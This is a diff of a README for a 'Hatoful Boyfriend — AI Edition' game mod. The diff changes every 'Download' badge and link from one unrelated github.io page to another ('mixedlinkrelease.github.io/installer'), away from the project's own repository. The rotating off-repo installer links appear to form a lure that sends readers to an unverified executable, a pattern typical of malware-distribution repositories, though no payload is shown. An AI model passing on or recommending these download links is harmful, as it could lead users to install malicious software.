@@ -2,9 +2,9 @@
 
 # Hatoful Boyfriend — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
-[![St. PigeoNation's Institute](https://img.shields.io/badge/St.%20PigeoNation's-Enrolled-9ecfff?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
+[![St. PigeoNation's Institute](https://img.shields.io/badge/St.%20PigeoNation's-Enrolled-9ecfff?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/Cindervawrench/hatoful-boyfriend-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/Cindervawrench/hatoful-boyfriend-ai-edition)
@@ -55,7 +55,7 @@ You are the only human at St. PigeoNation's Institute. A locally-hosted model pl
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://yobowgileysb.github.io/WinDownload/)**
+- **[⬇ Download the latest version](https://mixedlinkrelease.github.io/installer/)**
 - [Repository](https://github.com/Cindervawrench/hatoful-boyfriend-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
